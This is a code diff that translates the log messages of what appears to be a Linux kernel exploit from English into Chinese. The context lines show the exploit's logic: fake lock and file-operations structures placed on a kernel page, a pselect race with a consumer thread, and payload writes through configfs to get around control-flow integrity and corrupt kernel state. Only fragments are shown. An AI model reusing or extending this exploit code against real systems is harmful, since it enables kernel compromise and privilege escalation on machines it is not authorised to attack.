@@ -57,7 +57,7 @@ void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
   int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
   if (high_write < 0) {
-    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
+    pr_warning("pselect F_DUPFD 写入错误，错误码=%d\n", errno);
     return;
   }
   for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
@@ -89,7 +89,7 @@ void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
-    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
+    pr_error("pselect 路由缺失内核页 基址=%016zx 锁=%016zx 操作函数集=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
   }
@@ -104,8 +104,8 @@ void do_pselect_fake_lock_route(void) {
       if (!page_base || !fake_lock || !fake_fops) {
         cfi_last_step = 34;
         cfi_last_errno = errno;
-        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
-                 "lock=%016zx fops=%016zx\n",
+        pr_error("pselect 重试页准备失败 尝试次数=%d 基址=%016zx "
+                 "锁=%016zx 操作函数集=%016zx\n",
                  route_attempt, page_base, fake_lock, fake_fops);
         break;
       }
@@ -117,7 +117,7 @@ void do_pselect_fake_lock_route(void) {
     if (high_read < 0) {
       cfi_last_step = 31;
       cfi_last_errno = errno;
-      pr_error("pselect F_DUPFD read errno=%d\n", errno);
+      pr_error("pselect F_DUPFD 读取错误 错误码=%d\n", errno);
       close(pipefd[0]);
       close(pipefd[1]);
       break;
@@ -148,7 +148,7 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_go, 0);
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
-    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
+    pr_info("pselect 返回 尝试次数=%d 返回值=%d 错误码=%d 调用次数=%d 成功=%d 延迟微秒=%d\n",
             route_attempt, ret, saved_errno, calls, success, delay_usec);
 
     int route_signal = calls > 0 && success > 0;
@@ -171,11 +171,11 @@ void do_pselect_fake_lock_route(void) {
     if (route_verified || cfi_dirty_seen || !route_signal) {
       break;
     }
-    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
+    pr_info("pselect CFI未命中 尝试次数=%d/%d 步骤=%d 错误码=%d; 正在刷新FOPS页\n",
             route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
             cfi_last_errno);
   }
-  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
+  pr_info("pselect 路由完成 调用次数=%d 成功=%d 步骤=%d 错误码=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
 }
 
@@ -270,8 +270,8 @@ int restore_slide_boot_id(int fd) {
         fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
   configfs_read_once(
       fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
-  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
-          "want=%016llx after=%016llx errno=%d\n",
+  pr_info("slide恢复boot_id数据 pid=%d 返回值=%zd 之前=%016llx "
+          "期望=%016llx 之后=%016llx 错误码=%d\n",
           getpid(), slide_bootid_restore_ret,
           (unsigned long long)slide_bootid_before,
           (unsigned long long)slide_bootid_want,
@@ -311,7 +311,7 @@ int try_cfi_stage(void) {
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
   cfi_write_ret = n;
-  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
+  pr_info("CFI写入 返回值=%zd 错误码=%d\n", n, errno);
   if (n != (ssize_t)sizeof(payload)) {
     cfi_last_step = 1;
     cfi_last_errno = errno;
@@ -333,7 +333,7 @@ int try_cfi_stage(void) {
   ssize_t r =
     configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
   cfi_read_ret = r;
-  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
+  pr_info("CFI读取 返回值=%zd 错误码=%d\n", r, errno);
   if (r != (ssize_t)sizeof(readback) ||
       memcmp(readback, payload, sizeof(payload)) != 0) {
     cfi_last_step = 3;
